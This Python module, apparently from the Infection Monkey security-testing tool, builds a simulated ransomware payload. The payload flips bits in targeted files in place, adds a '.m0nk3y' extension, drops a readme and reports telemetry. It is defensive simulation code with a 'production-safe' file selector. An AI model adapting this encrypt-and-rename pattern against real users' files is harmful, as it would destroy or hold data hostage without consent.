import logging
from pprint import pformat

from infection_monkey.ransomware import readme_dropper
from infection_monkey.ransomware.file_selectors import ProductionSafeTargetFileSelector
from infection_monkey.ransomware.in_place_file_encryptor import InPlaceFileEncryptor
from infection_monkey.ransomware.ransomware_config import RansomwareConfig
from infection_monkey.ransomware.ransomware_payload import RansomwarePayload
from infection_monkey.ransomware.targeted_file_extensions import TARGETED_FILE_EXTENSIONS
from infection_monkey.telemetry.messengers.batching_telemetry_messenger import (
    BatchingTelemetryMessenger,
)
from infection_monkey.telemetry.messengers.legacy_telemetry_messenger_adapter import (
    LegacyTelemetryMessengerAdapter,
)
from infection_monkey.utils.bit_manipulators import flip_bits

EXTENSION = ".m0nk3y"
CHUNK_SIZE = 4096 * 24

logger = logging.getLogger(__name__)


def build_ransomware_payload(config: dict):
    logger.debug(f"Ransomware payload configuration:\n{pformat(config)}")
    ransomware_config = RansomwareConfig(config)

    file_encryptor = _build_file_encryptor()
    file_selector = _build_file_selector()
    leave_readme = _build_leave_readme()
    telemetry_messenger = _build_telemetry_messenger()

    return RansomwarePayload(
        ransomware_config,
        file_encryptor,
        file_selector,
        leave_readme,
        telemetry_messenger,
    )


def _build_file_encryptor():
    return InPlaceFileEncryptor(
        encrypt_bytes=flip_bits, new_file_extension=EXTENSION, chunk_size=CHUNK_SIZE
    )


def _build_file_selector():
    targeted_file_extensions = TARGETED_FILE_EXTENSIONS.copy()
    targeted_file_extensions.discard(EXTENSION)

    return ProductionSafeTargetFileSelector(targeted_file_extensions)


def _build_leave_readme():
    return readme_dropper.leave_readme


def _build_telemetry_messenger():
    telemetry_messenger = LegacyTelemetryMessengerAdapter()

    return BatchingTelemetryMessenger(telemetry_messenger)
